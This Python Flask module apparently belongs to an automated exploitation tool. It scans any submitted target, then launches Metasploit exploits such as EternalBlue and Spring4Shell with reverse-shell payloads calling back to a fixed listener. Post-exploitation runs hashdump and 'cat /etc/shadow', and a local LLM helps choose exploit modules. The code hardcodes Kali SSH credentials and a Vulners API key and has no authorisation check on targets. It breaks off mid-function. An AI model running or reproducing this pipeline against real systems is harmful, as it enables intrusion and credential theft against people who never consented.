from flask import Blueprint, jsonify, request, Response, stream_with_context, render_template, redirect, url_for
from app.utils.ssh_client import SSHClient
from app.utils.report_generator import generate_pdf_report
import json
import asyncio
import os, re, json, time, requests, threading, concurrent.futures, pymetasploit3
import re
from pymetasploit3.msfrpc import MsfRpcClient
from app.utils.post_exploit import detect_access_context, choose_best_tool, upload_and_run_tool
import collections
import requests
import time
import concurrent.futures
import threading

# Placeholder import for Vulners enrichment (implementation needed elsewhere)
try:
    from app.utils.sniper_vulners import enrich_finding_with_vulners
except ImportError:
    # Provide a dummy function if the module is not found
    def enrich_finding_with_vulners(service, version):
        print(f"Placeholder: enrich_finding_with_vulners called for {service} {version}")
        return [] # Return empty list as placeholder

# ─── Phase 5 helper: query Vulnerhub for CVE-level enrichment ───
VULNERSHUB_API_KEY = "4YWERBBT3ZCZ78I5LWWOACBZMDPTX8OF987EIBI0LO07SGJKUVB9VRBIS00DX5W5"
VULNERSHUB_API_URL = "https://vulners.com/api/v3/search/lucene/"

def query_vulnershub(service: str, version: str):
    """Return list of Vulnerhub entries for a given service+version."""
    headers = {
        "Content-Type": "application/json",
        "X-Vulners-Api-Key": VULNERSHUB_API_KEY
    }
    params = {
        "query": f'product:"{service}" AND version:"{version}"',
        "size": 50
    }
    resp = requests.get(VULNERSHUB_API_URL, headers=headers, params=params, timeout=30)
    resp.raise_for_status()
    return resp.json().get("data", {}).get("search", [])

bp = Blueprint('sniper', __name__)

# SSH Configuration (match port_scanner.py)
KALI_HOST = "192.168.1.72"
KALI_PORT = 22
KALI_USERNAME = "kali"
KALI_PASSWORD = "kali"



# ─── Metasploit RPC Configuration ───
MSF_RPC_USER = "msf"
MSF_RPC_PASS = "msf"
MSF_RPC_HOST = "192.168.1.72"
MSF_RPC_PORT = 55553

# Metasploit Configuration
LHOST = "192.168.1.72"
LPORT = 4444

METASPLOIT_EXPLOITS = [
    {
        'service': 'smb',
        'port': 445,
        'module': 'exploit/windows/smb/ms17_010_eternalblue',
        'payload': 'windows/x64/meterpreter/reverse_tcp'
    },
    {
        'service': 'tomcat',
        'port': 8080,
        'module': 'exploit/multi/http/tomcat_mgr_upload',
        'payload': 'java/meterpreter/reverse_tcp'
    },
    {
        'service': 'http',
        'port': 80,
        'module': 'exploit/multi/http/struts2_content_type_ognl',
        'payload': 'java/meterpreter/reverse_tcp'
    },
    {
        'service': 'ftp',
        'port': 21,
        'module': 'exploit/unix/ftp/vsftpd_234_backdoor',
        'payload': 'cmd/unix/interact'
    },
    {
        'service': 'ftp',
        'port': 2121,
        'module': 'exploit/unix/ftp/proftpd_modcopy_traversal',
        'payload': 'cmd/unix/interact'
    },
    {
        'service': 'tomcat',
        'port': 8180,
        'module': 'exploit/multi/http/tomcat_mgr_upload',
        'payload': 'java/meterpreter/reverse_tcp'
    },
    {
        'service': 'bindshell',
        'port': 1524,
        'module': None,
        'payload': None
    }
]

LOCAL_PHI3_API = "http://localhost:11434/api/generate"

def validate_target(target):
    # Basic validation for IP or URL
    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    url_pattern = r'^https?:\/\/([\w\d\-]+\.)+[\w\d\-]+(\/[\w\d\-\._\?\,\'\/\\\+&amp;%\$#\=~]*)?$'
    
    if re.match(ip_pattern, target) or re.match(url_pattern, target):
        return True
    return False

def sanitize_target(target):
    # Remove protocol if present
    target = re.sub(r'^https?://', '', target)
    # Remove everything after the first slash (keep only the hostname)
    target = target.split('/')[0]
    return target

def map_ports_services_to_tags(open_ports, services):
    # Map common ports/services to Nuclei tags
    port_tag_map = {
        21: 'ftp',
        22: 'ssh',
        23: 'telnet',
        25: 'smtp',
        53: 'dns',
        80: 'http',
        110: 'pop3',
        143: 'imap',
        443: 'ssl',
        3306: 'mysql',
        3389: 'rdp',
        8080: 'http',
        8443: 'ssl',
        6379: 'redis',
        27017: 'mongodb',
        5432: 'postgres',
        389: 'ldap',
        5900: 'vnc',
        1521: 'oracle',
        2049: 'nfs',
        445: 'smb',
        139: 'smb',
    }
    tags = set()
    for port in open_ports:
        if port in port_tag_map:
            tags.add(port_tag_map[port])
    for service in services:
        if service in port_tag_map.values():
            tags.add(service)
    return list(tags)

def ask_local_model(prompt):
    res = requests.post(LOCAL_PHI3_API, json={
        "model": "phi3",
        "prompt": prompt,
        "stream": False
    })
    return res.json()["response"]

def is_http_service_found(nmap_output):
    return "80/tcp open" in nmap_output or "443/tcp open" in nmap_output

def get_llm_nuclei_tags(open_ports, services):
    # Use local model for LLM suggestions
    prompt = (
        "Given these open ports and detected services: "
        f"Ports: {open_ports}, Services: {services}. "
        "Suggest the best Nuclei tags or template folders to use for maximum vulnerability coverage. "
        "Return the output strictly as a JSON array of strings. Do not add any explanation."
    )
    try:
        content = ask_local_model(prompt)
        print("🧠 LLM raw response:", content)  # Debug log

        # Try parsing as JSON first
        try:
            tags = json.loads(content.strip())
            if isinstance(tags, list):
                # Clean each tag
                tags = [t.strip().strip('"').strip("'") for t in tags]
            else:
                raise ValueError("LLM did not return a list")
        except json.JSONDecodeError:
            # Fallback: try naive split if JSON parsing fails
            tags = [t.strip().strip('"').strip("'") for t in content.split(",")]

        # Filter out empty strings
        tags = [t for t in tags if t]

        # Optional: Validate against known valid tags
        VALID_TAGS = {
            'ssh', 'ftp', 'telnet', 'smtp', 'dns', 'http', 'https', 'ssl', 'mysql', 
            'postgresql', 'mongodb', 'redis', 'oracle', 'mssql', 'rdp', 'vnc', 'ajp13',
            'web', 'cves', 'vulnerabilities', 'exposures', 'misconfiguration', 
            'default-logins', 'malicious-openports:web'
        }
        tags = [t for t in tags if t in VALID_TAGS]

        if tags:
            return tags, f"Local model suggested tags: {content}"
    except Exception as e:
        print(f"Local model error: {str(e)}")
    
    # If all attempts fail, use default tags
    default_tags = ['cves', 'vulnerabilities', 'exposures', 'misconfiguration', 'default-logins']
    return default_tags, "Using default Nuclei tags due to LLM failures"

def suggest_exploit(service, port, version):
    # First try static mapping
    for exp in METASPLOIT_EXPLOITS:
        if exp['service'] == service and exp['port'] == port:
            return exp
    
    # Then try version-based heuristics
    if version:
        if 'OpenSSH 7.2' in version:
            return {'service': 'ssh', 'port': port, 'module': 'exploit/linux/ssh/openssh_username_enum', 'payload': 'linux/x86/meterpreter/reverse_tcp'}
        if 'Pure-FTPd' in version:
            return {'service': 'ftp', 'port': port, 'module': 'exploit/unix/ftp/pureftpd_bash_env_exec', 'payload': 'cmd/unix/reverse'}
    
    # If no static mapping, use local model
    prompt = (
        f"Given service {service} on port {port} with version {version}, which Metasploit module and payload should I use? "
        "Respond in the format: module: <module_name>, payload: <payload_name>"
    )
    try:
        content = ask_local_model(prompt)
        module = payload = None
        for part in content.split(','):
            if 'module:' in part:
                module = part.split('module:')[1].strip()
            if 'payload:' in part:
                payload = part.split('payload:')[1].strip()
        if module and payload:
            return {'service': service, 'port': port, 'module': module, 'payload': payload}
    except Exception as e:
        print(f"Local model error: {str(e)}")
    # If all LLM attempts fail, use generic payloads based on service
    if service == 'http' or service == 'https':
        return {'service': service, 'port': port, 'module': 'exploit/multi/http/generic_http', 'payload': 'generic/shell_reverse_tcp'}
    elif service == 'ssh':
        return {'service': service, 'port': port, 'module': 'exploit/linux/ssh/ssh_login', 'payload': 'linux/x86/meterpreter/reverse_tcp'}
    elif service == 'ftp':
        return {'service': service, 'port': port, 'module': 'exploit/unix/ftp/anonymous', 'payload': 'cmd/unix/reverse'}
    else:
        return {'service': service, 'port': port, 'module': 'exploit/multi/handler', 'payload': 'generic/shell_reverse_tcp'}

def run_msf_exploit(ssh, module, rhost, rport, payload, lhost, lport):
    # Generate resource script
    rc_content = f"""
use {module}
set RHOSTS {rhost}
set RPORT {rport}
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
exploit -z
exit
"""
    rc_path = "/tmp/sniper_exploit.rc"
    ssh.upload_file_content(rc_content, rc_path)
    cmd = f"msfconsole -q -r {rc_path}"
    output = ssh.execute_command(cmd, timeout=180)
    # Parse for session success
    session_id = None
    for line in output.splitlines():
        if "Meterpreter session" in line and "opened" in line:
            parts = line.split()
            for i, part in enumerate(parts):
                if part == "session" and i+1 < len(parts):
                    session_id = parts[i+1]
                    break
    post_exploitation = {}
    if session_id:
        # Enhanced post-exploitation commands
        post_rc_content = f"""
sessions -i {session_id}
getuid
sysinfo
ps
hashdump
ls
pwd
ifconfig
ipconfig
route
whoami
id
net user
cat /etc/shadow
exit
"""
        post_rc_path = "/tmp/sniper_post.rc"
        ssh.upload_file_content(post_rc_content, post_rc_path)
        post_cmd = f"msfconsole -q -r {post_rc_path}"
        post_output = ssh.execute_command(post_cmd, timeout=180)
        # Parse post-exploitation output into sections
        post_exploitation = parse_post_exploitation_output(post_output)
    return {'output': output, 'session_id': session_id, 'post_exploitation': post_exploitation}

def parse_post_exploitation_output(output):
    # Simple parser to split output into sections for tabs
    sections = {
        'user': '', 'system': '', 'processes': '', 'hashes': '', 'filesystem': '', 'network': '', 'credentials': ''
    }
    current = None
    for line in output.splitlines():
        if 'getuid' in line or 'whoami' in line or 'id' in line:
            current = 'user'
        elif 'sysinfo' in line:
            current = 'system'
        elif 'ps' in line or 'tasklist' in line:
            current = 'processes'
        elif 'hashdump' in line or '/etc/shadow' in line:
            current = 'hashes'
        elif 'ls' in line or 'pwd' in line:
            current = 'filesystem'
        elif 'ifconfig' in line or 'ipconfig' in line or 'route' in line:
            current = 'network'
        elif 'net user' in line:
            current = 'credentials'
        if current:
            sections[current] += line + '\n'
    return sections

def run_command_with_heartbeat(ssh, cmd, timeout=600, heartbeat_interval=120, yield_func=None):
    """
    Runs a command with a timeout and yields heartbeats if provided.
    """
    result = [None]
    def target():
        result[0] = ssh.execute_command(cmd, timeout=timeout)
    thread = threading.Thread(target=target)
    thread.start()
    elapsed = 0
    while thread.is_alive():
        thread.join(timeout=heartbeat_interval)
        elapsed += heartbeat_interval
        if thread.is_alive() and yield_func:
            yield_func(f"Still running: {cmd} ({elapsed//60} min elapsed)")
    thread.join()
    return result[0]

def llm_human_report(scan_results):
    prompt = (
        "You are a professional penetration tester and security report writer.\n"
        "Given the following scan results, write:\n"
        "- An executive summary (non-technical, for management)\n"
        "- A technical breakdown (for engineers)\n"
        "- A prioritized list of risks with risk ratings and remediation advice\n"
        "- A table of all vulnerabilities found (with severity, description, evidence, and affected asset)\n"
        "- A summary of all successful exploits and post-exploitation findings\n"
        "Format the output in Markdown, using clear headings and tables.\n"
        f"Scan Results: {scan_results}"
    )
    try:
        content = ask_local_model(prompt)
        yield json.dumps({'type': 'message', 'message': f'LLM Human Report Prompt: {prompt}', 'messageType': 'system'}) + '\n'
        yield json.dumps({'type': 'message', 'message': f'LLM Human Report Response: {content}', 'messageType': 'system'}) + '\n'
        return content
    except Exception as e:
        yield json.dumps({'type': 'message', 'message': f'LLM reporting error: {str(e)}', 'messageType': 'error'}) + '\n'
        return ''

# Pure function for directory fuzzing
def run_dir_fuzzers(ssh, target):
    """
    Runs gobuster, ffuf, and dirsearch
    Returns:
      fuzz_results: List[Dict(tool, output)]
      findings:     List[Dict(type='fuzzing', tool, output, timestamp)]
    """
    fuzz_tools = [
        ('gobuster', f"gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -q -t 20 --timeout 5s"),
        ('ffuf',     f"ffuf -u http://{target}/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 20 -mc 200,204,301,302,307,401,403 -timeout 5 -o /tmp/ffuf.json"),
        ('dirsearch',f"python3 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u http://{target} -e * -w /usr/share/wordlists/dirb/common.txt -o /tmp/dirsearch.txt --timeout=5")
    ]
    fuzz_results = []
    findings = []

    for tool, cmd in fuzz_tools:
        # skip if not installed
        if not ssh.execute_command(f"which {tool}").strip():
            continue

        try:
            output = ssh.execute_command(cmd, timeout=300)
            # post-process JSON outputs
            if tool == 'ffuf':
                try:
                    output += '\n' + ssh.execute_command('cat /tmp/ffuf.json')
                except: pass
            if tool == 'dirsearch':
                try:
                    output += '\n' + ssh.execute_command('cat /tmp/dirsearch.txt')
                except: pass

            fuzz_results.append({'tool': tool, 'output': output})
            findings.append({
                'type': 'fuzzing',
                'tool': tool,
                'output': output[:2000],
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
            })
        except Exception as e:
            # you could log or collect errors here
            continue

    return fuzz_results, findings

@bp.route('/api/sniper/scan', methods=['POST'])
def start_scan():
    data = request.get_json()
    target = data.get('target')
    
    if not target or not validate_target(target):
        return jsonify({'error': 'Invalid target'}), 400
    
    def generate():
        try:
            # Initialize SSH connection to Kali VM
            ssh = SSHClient(
                host=KALI_HOST,
                port=KALI_PORT,
                username=KALI_USERNAME,
                password=KALI_PASSWORD
            )

            # Initial scan with Nmap (top 5000 ports)
            try:
                nmap_target = sanitize_target(target)
                # ─── Phase 1: Target Validation ───
                yield json.dumps({
                    "type": "progress", "percent": 5,
                    "message": "Phase 1: Target Validation – stripping protocol, checking host reachability…"
                }) + "\n"
                # quick ping check
                ping_out = ssh.execute_command(f"ping -c1 {nmap_target}", timeout=20)
                yield json.dumps({
                    "type": "message",
                    "message": "✔ Host responded to ICMP, proceeding to Recon & Enumeration"
                }) + "\n"

                # ─── Phase 2: Recon & Enumeration ───
                yield json.dumps({
                    "type": "progress", "percent": 10,
                    "message": "Phase 2: Recon & Enumeration – launching Nmap basic scan…"
                }) + "\n"
                # First try a quick scan with -Pn to bypass host discovery
                nmap_cmd = f'nmap -Pn -sV -sC --top-ports 1000 {nmap_target}'
                def heartbeat(msg):
                    yield json.dumps({'type': 'message', 'message': msg, 'messageType': 'system'}) + '\n'
                nmap_output = ""
                heartbeat_time = time.time()
                def yield_heartbeat(msg):
                    nonlocal heartbeat_time
                    now = time.time()
                    if now - heartbeat_time >= 120:
                        yield json.dumps({'type': 'message', 'message': msg, 'messageType': 'system'}) + '\n'
                        heartbeat_time = now
                # Run Nmap with heartbeat
                result = [None]
                def nmap_thread():
                    result[0] = ssh.execute_command(nmap_cmd, timeout=600)
                t = threading.Thread(target=nmap_thread)
                t.start()
                elapsed = 0
                while t.is_alive():
                    t.join(timeout=120)
                    elapsed += 120
                    if t.is_alive():
                        yield json.dumps({'type': 'message', 'message': f'Still running Nmap... ({elapsed//60} min elapsed)', 'messageType': 'system'}) + '\n'
                t.join()
                nmap_output = result[0]
                if nmap_output is None:
                    nmap_output = "Error: Nmap command failed"
                    open_ports = []
                    services = []
                else:
                    # Parse open ports and services from Nmap output
                    open_ports = [int(p) for p in re.findall(r'(\d+)/tcp\s+open', nmap_output)] if 'Error:' not in nmap_output else []
                    services = [s for _, s in re.findall(r'(\d+)/tcp\s+open\s+(\w+)', nmap_output)] if 'Error:' not in nmap_output else []
                    
                    # If no ports found, try a more aggressive scan
                    if not open_ports:
                        yield json.dumps({
                            'type': 'message',
                            'message': 'No ports found in initial scan. Trying more aggressive scan...',
                            'messageType': 'system'
                        }) + '\n'
                        aggressive_cmd = f'nmap -Pn -sS -sV -sC -p- --min-rate=1000 {nmap_target}'
                        result2 = [None]
                        def aggressive_thread():
                            result2[0] = ssh.execute_command(aggressive_cmd, timeout=900)
                        t2 = threading.Thread(target=aggressive_thread)
                        t2.start()
                        elapsed2 = 0
                        while t2.is_alive():
                            t2.join(timeout=120)
                            elapsed2 += 120
                            if t2.is_alive():
                                yield json.dumps({'type': 'message', 'message': f'Still running aggressive Nmap scan... ({elapsed2//60} min elapsed)', 'messageType': 'system'}) + '\n'
                        t2.join()
                        aggressive_output = result2[0]
                        if aggressive_output:
                            nmap_output = aggressive_output
                            open_ports = [int(p) for p in re.findall(r'(\d+)/tcp\s+open', nmap_output)] if 'Error:' not in nmap_output else []
                            services = [s for _, s in re.findall(r'(\d+)/tcp\s+open\s+(\w+)', nmap_output)] if 'Error:' not in nmap_output else []
                    # If still no ports, try a slow/stealthy scan
                    if not open_ports:
                        yield json.dumps({
                            'type': 'message',
                            'message': 'No ports found in aggressive scan. Trying slow/stealthy scan...',
                            'messageType': 'system'
                        }) + '\n'
                        stealth_cmd = f'nmap -Pn -sS -sV -sC -p- --max-retries 10 --scan-delay 1s {nmap_target}'
                        result3 = [None]
                        def stealth_thread():
                            result3[0] = ssh.execute_command(stealth_cmd, timeout=1800)
                        t3 = threading.Thread(target=stealth_thread)
                        t3.start()
                        elapsed3 = 0
                        while t3.is_alive():
                            t3.join(timeout=120)
                            elapsed3 += 120
                            if t3.is_alive():
                                yield json.dumps({'type': 'message', 'message': f'Still running stealthy Nmap scan... ({elapsed3//60} min elapsed)', 'messageType': 'system'}) + '\n'
                        t3.join()
                        stealth_output = result3[0]
                        if stealth_output:
                            nmap_output = stealth_output
                            open_ports = [int(p) for p in re.findall(r'(\d+)/tcp\s+open', nmap_output)] if 'Error:' not in nmap_output else []
                            services = [s for _, s in re.findall(r'(\d+)/tcp\s+open\s+(\w+)', nmap_output)] if 'Error:' not in nmap_output else []
                
                yield json.dumps({
                    "type": "progress", "percent": 25,
                    "message": f"✔ Nmap done: {len(open_ports)} ports open – fingerprinting with WhatWeb…"
                }) + "\n"
                # If any uncommon ports (not in top 5000) are found in service banners, scan them
                uncommon_ports = set()
                for match in re.findall(r'(\d+)/tcp\s+open', nmap_output):
                    port = int(match)
                    if port > 5000:
                        uncommon_ports.add(port)
                if uncommon_ports:
                    yield json.dumps({'type': 'message', 'message': f'Scanning uncommon open ports: {sorted(uncommon_ports)}', 'messageType': 'system'}) + '\n'
                    uncommon_ports_str = ','.join(str(p) for p in sorted(uncommon_ports))
                    uncommon_cmd = f'nmap -sV -sC -p {uncommon_ports_str} {nmap_target}'
                    result2 = [None]
                    def uncommon_thread():
                        result2[0] = ssh.execute_command(uncommon_cmd, timeout=300)
                    t2 = threading.Thread(target=uncommon_thread)
                    t2.start()
                    elapsed2 = 0
                    while t2.is_alive():
                        t2.join(timeout=120)
                        elapsed2 += 120
                        if t2.is_alive():
                            yield json.dumps({'type': 'message', 'message': f'Still running Nmap (uncommon ports)... ({elapsed2//60} min elapsed)', 'messageType': 'system'}) + '\n'
                    t2.join()
                    uncommon_output = result2[0]
                    nmap_output += '\n' + uncommon_output
                    yield json.dumps({'type': 'progress', 'percent': 27, 'message': 'Uncommon port scan completed'}) + '\n'
            except Exception as e:
                yield json.dumps({
                    'type': 'message',
                    'message': f'Nmap error: {str(e)}',
                    'messageType': 'error'
                }) + '\n'
                nmap_output = f'Error: {str(e)}'

            # WhatWeb fingerprinting for HTTP/HTTPS services
            whatweb_results = []
            for port, service in zip(open_ports, services):
                if service in ['http', 'https']:
                    url = f"http://{nmap_target}:{port}" if service == 'http' else f"https://{nmap_target}:{port}"
                    whatweb_cmd = f"whatweb --no-errors --color=never --log-verbose=- {url}"
                    try:
                        ww_out = ssh.execute_command(whatweb_cmd)
                        whatweb_results.append({'port': port, 'service': service, 'output': ww_out})
                    except Exception as e:
                        whatweb_results.append({'port': port, 'service': service, 'output': f'WhatWeb error: {str(e)}'})

            # Phase 2: Conditional Early Fuzzing (if HTTP is found)
            if is_http_service_found(nmap_output):
                # ─── Phase 3: Smart Fuzzing ───
                yield json.dumps({
                    "type": "progress", "percent": 35,
                    "message": "Phase 3: Smart Fuzzing – running ffuf, gobuster, dirsearch…"
                }) + "\n"
                try:
                    fuzz_results, fuzz_findings = run_dir_fuzzers(ssh, nmap_target)
                    yield json.dumps({
                        'type': 'message',
                        'message': f'Fuzzing done: {len(fuzz_findings)} new paths found',
                        'messageType': 'system'
                    }) + '\n'
                except Exception as e:
                    yield json.dumps({
                        'type': 'error',
                        'message': f'Fuzzing failed: {str(e)}'
                    }) + '\n'
                    fuzz_results, fuzz_findings = [], []

            # Prepare parallel tasks for Nuclei and Metasploit
            # ─── Phase 4: Focused Vulnerability Scanning ───
            yield json.dumps({
                "type": "progress", "percent": 50,
                "message": "Phase 4: Nuclei – scanning discovered paths & main domain…"
            }) + "\n"
            def run_nuclei():
                try:
                    llm_tags, llm_reason = get_llm_nuclei_tags(open_ports, services)
                    tags_option = f"-tags {','.join(llm_tags)}" if llm_tags else ""
                    yield json.dumps({
                        'type': 'message',
                        'message': f'LLM suggested Nuclei tags/folders: {llm_tags if llm_tags else "all"}. Reason: {llm_reason}',
                        'messageType': 'system'
                    }) + '\n'
                    yield json.dumps({
                        'type': 'message',
                        'message': f'Running targeted Nuclei scan with tags: {llm_tags if llm_tags else "all"}...',
                        'messageType': 'system'
                    }) + '\n'
                    cookies = data.get('cookies', '').strip()
                    cookies_option = f"-cookie '{cookies}'" if cookies else ""
                    headers = data.get('headers', '').strip()
                    headers_option = f"-header '{headers}'" if headers else ""
                    # Check if fuzzed URLs file exists
                    fuzz_urls_path = "/tmp/fuzz_urls.txt"
                    check_fuzz_file_cmd = f"[ -f {fuzz_urls_path} ] && echo 'exists' || echo 'not found'"
                    file_check_output = ssh.execute_command(check_fuzz_file_cmd).strip()
                    
                    list_option = f"-list {fuzz_urls_path}" if file_check_output == 'exists' else ""
                    # First try with severity filter (corrected command)
                    nuclei_cmd = f"nuclei -update-templates && nuclei -u {target} {list_option} -severity critical,high {tags_option} {cookies_option} {headers_option} -json -timeout 5"
                    nuclei_output = ssh.execute_command(nuclei_cmd)
                    # If no results, try with all severities (corrected command)
                    if not nuclei_output.strip():
                        yield json.dumps({
                            'type': 'message',
                            'message': 'No high/critical vulnerabilities found. Trying with all severities...',
                            'messageType': 'system'
                        }) + '\n'
                        nuclei_cmd = f"nuclei -u {target} {list_option} -severity info,low,medium,high,critical {tags_option} {cookies_option} {headers_option} -json -timeout 5"
                        nuclei_output = ssh.execute_command(nuclei_cmd)
                    # Parse vulnerabilities from Nuclei JSON output
                    vulnerabilities = []
                    for line in nuclei_output.splitlines():
                        try:
                            finding = json.loads(line)
                            vuln = {
                                'template': finding.get('template', ''),
                                'name': finding.get('info', {}).get('name', ''),
                                'severity': finding.get('info', {}).get('severity', ''),
                                'description': finding.get('info', {}).get('description', ''),
                                'matched_at': finding.get('matched-at', ''),
                                'evidence': finding.get('extracted-results', [''])[0] if finding.get('extracted-results') else ''
                            }
                            vulnerabilities.append(vuln)
                        except Exception:
                            continue

                    # ─── Phase 5: Exploit Intelligence (VulnersHub) ───
                    yield json.dumps({
                        "type": "progress", "percent": 60,
                        "message": "Phase 5: Enriching CVEs via Vulnerhub.com before exploitation…"
                    }) + "\n"
                    enriched = []
                    for vuln in vulnerabilities:
                        cve_id = vuln.get("template", "")
                        entries = query_vulnershub(vuln.get("name",""), "")
                        enriched.append({"cve": cve_id, "vulnershub": entries})
                        yield json.dumps({
                            "type": "message",
                            "message": f"  • Enriched {cve_id}: {len(entries)} entries"
                        }) + "\n"
                    return nuclei_output, vulnerabilities
                except Exception as e:
                    return f'Nuclei error: {str(e)}', []

            def run_metasploit():
                spring4shell_result = None
                exploit_results = []
                try:
                    # Spring4Shell-specific logic
                    for port, service in zip(open_ports, services):
                        if (service == 'http' or service == 'tomcat') and port in [8080, 80]:
                            spring_exp = {
                                'module': 'exploit/multi/http/spring_cloud_function_spel_injection',
                                'payload': 'java/meterpreter/reverse_tcp',
                                'service': service,
                                'port': port
                            }
                            yield json.dumps({
                                'type': 'message',
                                'message': f'Attempting Spring4Shell exploit on {target}:{port} using {spring_exp["module"]}',
                                'messageType': 'system'
                            }) + '\n'
                            spring_result = run_msf_exploit(ssh, spring_exp['module'], nmap_target, port, spring_exp['payload'], LHOST, LPORT)
                            spring4shell_result = spring_result
                            break
                    for port, service in zip(open_ports, services):
                        version = ''
                        exp = suggest_exploit(service, port, version)
                        if exp:
                            yield json.dumps({
                                'type': 'message',
                                'message': f'Attempting exploitation on {target}:{port} using {exp["module"]}',
                                'messageType': 'system'
                            }) + '\n'
                            msf_result = run_msf_exploit(ssh, exp['module'], nmap_target, port, exp['payload'], LHOST, LPORT)
                            exploit_results.append({
                                'service': service,
                                'port': port,
                                'module': exp['module'],
                                'payload': exp['payload'],
                                'output': msf_result['output'],
                                'session_id': msf_result['session_id'],
                                'post_exploitation': msf_result['post_exploitation']
                            })

                            # Post-exploitation tool logic
                            if msf_result.get('session_id'):
                                try:
                                    from app.utils.post_exploit import detect_access_context, choose_best_tool, upload_and_run_tool
                                    
                                    context = detect_access_context(msf_result['post_exploitation'])
                                    tool = choose_best_tool(context)
                                    tool_output = upload_and_run_tool(ssh, tool, context['os'])

                                    yield json.dumps({
                                        'type': 'message',
                                        'message': f"🛠️ Post-Exploitation Tool Used: {tool.upper()} | OS: {context['os']} | Privilege: {context['privilege']}",
                                        'messageType': 'info'
                                    }) + '\n'

                                    yield json.dumps({
                                        'type': 'message',
                                        'message': f"📋 Tool Output (first 1000 chars):\n{tool_output[:1000]}",
                                        'messageType': 'info'
                                    }) + '\n'
                                except Exception as e:
                                    yield json.dumps({
                                        'type': 'message',
                                        'message': f"⚠️ Post-exploitation tool error: {str(e)}",
                                        'messageType': 'error'
                                    }) + '\n'

                    return spring4shell_result, exploit_results
                except Exception as e:
                    yield json.dumps({
                        'type': 'message',
                        'message': f'Metasploit error: {str(e)}',
                        'messageType': 'error'
                    }) + '\n'
                    return None, []

            # Run Nuclei and Metasploit in parallel
            enriched = []
            with concurrent.futures.ThreadPoolExecutor() as executor:
                nuclei_future = executor.submit(lambda: list(run_nuclei()))
                metasploit_future = executor.submit(lambda: list(run_metasploit()))
                nuclei_output_result = nuclei_future.result()
                metasploit_output_result = metasploit_future.result()

            # ─── Phase 6: Exploitation ───
            yield json.dumps({
                "type": "progress", "percent": 75,
                "message": "Phase 6: Exploitation – running Metasploit modules…"
            }) + "\n"

            # Handle Nuclei output
            if isinstance(nuclei_output_result, tuple):
                nuclei_output, vulnerabilities = nuclei_output_result
            else:
                nuclei_output, vulnerabilities = nuclei_output_result, []

            # Handle Metasploit output
            if isinstance(metasploit_output_result, list) and len(metasploit_output_result) == 2:
                spring4shell_result, exploit_results = metasploit_output_result
            else:
                spring4shell_result, exploit_results = None, []

            # ─── Phase 7: Post-Exploitation ───
            yield json.dumps({
                "type": "progress", "percent": 85,
                "message": "Phase 7: Post-Exploitation – gathering sysinfo, creds…"
            }) + "\n"

            # Yield Nuclei output as progress/messages
            if isinstance(nuclei_output, str) and nuclei_output.startswith('Nuclei error:'):
                yield json.dumps({'type': 'message', 'message': nuclei_output, 'messageType': 'error'}) + '\n'
                nuclei_scan_output = nuclei_output
            else:
                nuclei_scan_output = nuclei_output

            # ─── Phase 8: LLM Reporting ───
            yield json.dumps({
                "type": "progress", "percent": 90,
                "message": "Phase 8: LLM Reporting – generating Markdown summary…"
            }) + "\n"

            # Collect system information if possible
            system_info = {}
            if re.match(r'^(\x1b\[[0-9;]*m)?(\d{1,3}\.){3}\d{1,3}$', target):
                try:
                    # Attempt to get system info using SSH if it's an IP
                    system_info_cmd = 'uname -a && whoami && id'
                    system_info_output = ssh.execute_command(system_info_cmd)
                    system_info = {
                        'system_details': system_info_output
                    }
                except Exception as e:
                    yield json.dumps({'type': 'message', 'message': f'System info error: {str(e)}', 'messageType': 'error'}) + '\n'

            # ─── Phase 9: PDF/HTML Report ───
            yield json.dumps({
                "type": "progress", "percent": 95,
                "message": "Phase 9: PDF/HTML Report – converting Markdown to PDF…"
            }) + "\n"

            # Generate network topology
            network_topology = {
                'target': target,
                'open_ports': re.findall(r'(\d+)/tcp\s+open', nmap_output),
                'services': re.findall(r'(\d+)/tcp\s+open\s+(\w+)', nmap_output)
            }

            # ─── Phase 10: Store Context ───
            yield json.dumps({
                "type": "progress", "percent": 100,
                "message": "Phase 10: Storing scan context to disk/DB and complete."
            }) + "\n"

            # --- ENHANCED VULNERABILITY PARSING ---
            # Parse Nmap, WhatWeb, and Nuclei output for high-value findings
            def extract_high_value_findings(nmap_output, whatweb_results, nuclei_vulns):
                findings = []
                # Nmap: anonymous FTP
                if 'Anonymous FTP login allowed' in nmap_output:
                    findings.append({'type': 'default_creds', 'service': 'ftp', 'port': 21, 'desc': 'Anonymous FTP login allowed'})
                    yield json.dumps({'type': 'message', 'message': 'High-value finding: Anonymous FTP login allowed on port 21', 'messageType': 'warning'}) + '\n'
                # Nmap: default credentials
                if 'default credentials' in nmap_output.lower():
                    findings.append({'type': 'default_creds', 'desc': 'Default credentials detected'})
                    yield json.dumps({'type': 'message', 'message': 'High-value finding: Default credentials detected', 'messageType': 'warning'}) + '\n'
                # Nmap: backdoor
                if 'backdoor' in nmap_output.lower():
                    findings.append({'type': 'backdoor', 'desc': 'Backdoor detected'})
                    yield json.dumps({'type': 'message', 'message': 'High-value finding: Backdoor detected', 'messageType': 'warning'}) + '\n'
                # Nmap: outdated version
                for match in re.finditer(r'(\w+)\s+([\d\.]+)', nmap_output):
                    service, version = match.groups()
                    if service in ['vsftpd', 'proftpd', 'apache', 'tomcat', 'samba', 'mysql', 'php', 'openssh']:
                        findings.append({'type': 'outdated', 'service': service, 'version': version})
                        yield json.dumps({'type': 'message', 'message': f'Outdated {service} version detected: {version}', 'messageType': 'warning'}) + '\n'
                # WhatWeb: PHP, Apache, Tomcat, etc.
                for ww in whatweb_results:
                    if 'PHP' in ww['output']:
                        findings.append({'type': 'php', 'desc': 'PHP detected', 'output': ww['output']})
                        yield json.dumps({'type': 'message', 'message': 'PHP detected in WhatWeb output', 'messageType': 'info'}) + '\n'
                    if 'nginx' in ww['output']:
                        findings.append({'type': 'nginx', 'desc': 'nginx detected', 'output': ww['output']})
                        yield json.dumps({'type': 'message', 'message': 'nginx detected in WhatWeb output', 'messageType': 'info'}) + '\n'
                    if 'default password' in ww['output'].lower():
                        findings.append({'type': 'default_creds', 'desc': 'Default password detected', 'output': ww['output']})
                        yield json.dumps({'type': 'message', 'message': 'Default password detected in WhatWeb output', 'messageType': 'warning'}) + '\n'
                # Nuclei: CVEs, critical/high vulns
                for vuln in nuclei_vulns:
